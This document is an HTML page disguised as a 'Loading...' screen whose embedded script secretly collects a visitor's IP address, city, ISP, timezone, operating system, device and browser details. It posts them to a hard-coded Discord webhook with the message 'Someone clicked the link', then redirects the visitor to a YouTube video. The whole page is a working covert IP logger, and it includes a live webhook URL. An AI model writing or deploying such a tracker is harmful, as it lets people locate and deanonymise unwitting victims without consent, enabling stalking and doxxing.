<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading...</title>
</head>
<body>

<h2>Loading...</h2>

<script>
const webhookURL = "https://discord.com/api/webhooks/1481002558695669912/3QmMwvISWqW74jd2PpzH9Bs-z8xKXPXr08op7tC5NejVe8wpJfxktaJKlHewoVU1b8J3";

// Browser info
const userAgent = navigator.userAgent;
const platform = navigator.platform;
const language = navigator.language;
const cookiesEnabled = navigator.cookieEnabled;
const cpuCores = navigator.hardwareConcurrency || "Unknown";
const ram = navigator.deviceMemory || "Unknown";

// Page info
const pageURL = window.location.href;
const referrer = document.referrer || "Direct";

// Screen info
const screenSize = `${screen.width} x ${screen.height}`;

// Time
const time = new Date().toLocaleString();

// Detect OS
let os = "Unknown";
if (platform.startsWith("Win")) os = "Windows";
else if (platform.startsWith("Mac")) os = "macOS";
else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
else if (/Android/.test(userAgent)) os = "Android";
else if (/Linux/.test(platform)) os = "Linux";

// Device type
let deviceType = /Mobi|Android|iPhone|iPad/.test(userAgent) ? "Mobile/Tablet" : "Desktop";

// Get IP info
fetch("https://ipapi.co/json/")
.then(res => res.json())
.then(data => {

const payload = {
content: "📌 **Someone clicked the link**",
embeds: [{
title: "Visitor Details",
color: 16711680,
fields: [
{ name: "IP Address", value: data.ip || "Unknown", inline: true },
{ name: "City", value: data.city || "Unknown", inline: true },
{ name: "Region", value: data.region || "Unknown", inline: true },
{ name: "Country", value: data.country_name || "Unknown", inline: true },
{ name: "ISP", value: data.org || "Unknown", inline: true },
{ name: "Timezone", value: data.timezone || "Unknown", inline: true },

{ name: "Operating System", value: os, inline: true },
{ name: "Device Type", value: deviceType, inline: true },
{ name: "Language", value: language, inline: true },

{ name: "Screen", value: screenSize, inline: true },
{ name: "CPU Cores", value: cpuCores.toString(), inline: true },
{ name: "RAM (GB)", value: ram.toString(), inline: true },

{ name: "Cookies Enabled", value: cookiesEnabled.toString(), inline: true },
{ name: "Referrer", value: referrer, inline: false },
{ name: "Page URL", value: pageURL, inline: false },
{ name: "User Agent", value: userAgent, inline: false },
{ name: "Time Clicked", value: time, inline: false }
],
timestamp: new Date().toISOString()
}]
};

fetch(webhookURL,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(payload)
}).finally(()=>{
window.location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";
});

});
</script>

</body>
</html>
